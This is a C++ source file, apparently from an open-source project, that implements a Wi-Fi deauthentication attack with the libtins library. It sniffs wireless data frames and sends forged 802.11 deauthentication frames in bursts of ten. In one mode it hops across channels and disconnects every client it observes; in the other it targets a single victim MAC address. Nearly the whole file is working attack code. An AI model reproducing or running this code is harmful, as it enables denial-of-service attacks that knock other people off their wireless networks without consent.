/*The MIT License (MIT)
*
* Copyright (c) 2016 5kyc1ad(SangHyeon Jeon)
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#include "deauth.h"

Deauth::Deauth() { }

void Deauth::sendDeauth(Dot11::address_type ap, Dot11::address_type st){

    Dot11Deauthentication deauth = Dot11Deauthentication();
    RadioTap radio = RadioTap();

    deauth.addr1(ap);
    deauth.addr2(st);
    deauth.addr3(ap);

    radio.inner_pdu(deauth);

    std::clog << "[*] Deauth ( " << ap << " - " << st << " )" << std::endl;
    for(int i=0; i< 10; i++){
        pSender.send(radio, "wlan0");
    }

}

void Deauth::rotateChannel() {
    unsigned int i = 1;
    char chan[64] = {0};
    while(true) {
        std::this_thread::sleep_for(std::chrono::seconds(5));
        sprintf(chan, "iwconfig wlan0 channel %d", (i % 13) + 1);
        system(chan);
        std::clog << "[*] Channel Changed : " << i % 13 << std::endl;
        i++;
    }
}

void Deauth::changeChannel(int toChan) {
    char chan[64] = {0};
    sprintf(chan, "iwconfig wlan0 channel %d", toChan);
    system(chan);
    std::clog << "[*] Channel Changed : " << chan << std::endl;
}

void Deauth::startSniffing() {
    std::clog << "[*] Start Sniffing" << std::endl;
    Sniffer sniffer("wlan0", Sniffer::promisc_type::NON_PROMISC, "", true);
    sniffer.sniff_loop(make_sniffer_handler(this, &Deauth::packetHandler));
}

void Deauth::startSniffingOne() {
    std::clog << "[*] Start SniffingOne" << std::endl;
    Sniffer sniffer("wlan0", Sniffer::promisc_type::NON_PROMISC, "", true);
    sniffer.sniff_loop(make_sniffer_handler(this, &Deauth::packetHandlerOne));
}

void Deauth::deauthAll() {
    std::thread rotateChannelThread(&Deauth::rotateChannel, this);
    std::thread sniffThread(&Deauth::startSniffing, this);
    rotateChannelThread.join();
    sniffThread.join();
}

void Deauth::deauthOne(Dot11::address_type victim, int channel) {
    changeChannel(channel);
    m_victim = victim;
    std::thread sniffThread(&Deauth::startSniffingOne, this);
    sniffThread.join();
}

bool Deauth::packetHandler(PDU &pdu) {
    try{
        if(pdu.find_pdu<Dot11Data>()) { // Frame with Data && Indiscriminate
            sendDeauth(pdu.rfind_pdu<Dot11Data>().dst_addr(), pdu.rfind_pdu<Dot11Data>().src_addr());
        }
    } catch(std::runtime_error& error) {
        std::clog << "[*] Error Occured. Restart." << std::endl;
    }
    return true;
}

bool Deauth::packetHandlerOne(PDU &pdu) {
    try{
        if(pdu.find_pdu<Dot11Data>() && pdu.rfind_pdu<Dot11Data>().src_addr() == m_victim) { // Frame with Data && Target
            sendDeauth(pdu.rfind_pdu<Dot11Data>().dst_addr(), pdu.rfind_pdu<Dot11Data>().src_addr());
        }
    } catch(std::runtime_error& error) {
        std::clog << "[*] Error Occured. Restart." << std::endl;
    }
    return true;
}